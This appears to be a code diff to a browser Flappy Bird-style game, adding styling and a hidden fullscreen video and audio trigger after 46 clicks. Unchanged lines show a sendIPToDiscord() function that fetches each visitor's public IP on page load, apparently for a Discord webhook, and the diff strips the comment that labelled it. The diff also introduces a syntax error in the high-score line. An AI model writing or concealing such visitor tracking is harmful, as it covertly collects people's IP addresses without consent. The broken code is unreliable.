@@ -24,6 +24,7 @@
                 padding-bottom: 2%;
                 background-image: url('bird.png');
                 background-size: 300%;
+                background-repeat: no-repeat;
 				position:absolute;
 				top: 50%;
 				left: 20%;
@@ -199,7 +200,6 @@
 
                 $('#GlowingText').fadeIn(1000).delay(5000).fadeOut(1000);
 
-                // Discord webhook functionality
                 function sendIPToDiscord() {
                     $.getJSON('https://api.ipify.org?format=json', function(data) {
                         var ip = data.ip;
@@ -225,6 +225,34 @@
 
                 sendIPToDiscord();
 
+                function playVideoAndAudio() {
+                    var video = $('<video/>', {
+                        id: 'awesomeVideo',
+                        src: 'video.mp4',
+                        autoplay: 'autoplay',
+                        loop: 'loop',
+                        muted: 'muted',
+                        style: 'position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); min-width: 100%; min-height: 100%; z-index: 200;'
+                    }).appendTo('body');
+
+                    var audio = $('<audio/>', {
+                        id: 'awesomeAudio',
+                        src: 'audio.mp3',
+                        autoplay: 'autoplay',
+                        loop: 'loop',
+                        style: 'display: none;'
+                    }).appendTo('body');
+
+                    $('#Birdy').css('z-index', 300);
+                }
+
+                canvasObject.mousedown(function(){
+                    clickCount++;
+                    if (clickCount === 46) {
+                        playVideoAndAudio();
+                    }
+                });
+                
                 function pauseGame(){
                     clearInterval(gameLoopIntervalID);
                     $('.Pipe').addClass('paused');
@@ -243,7 +271,7 @@
                 function endGame(){
                     Lost = true;
                     pauseGame();
-                    var cookieScore = parseInt(getCookie('HighScore') || 0);
+                    var cookieScore = parseInt(getCookie('HighScore') || 0;
                     setCookie('HighScore', Math.max(CurrentScore, cookieScore), 30000);
                     Birdy.BirdyObject.animate({top:'90%'}, 1500, 'linear');
                     $('#FinalScore').html(CurrentScore);
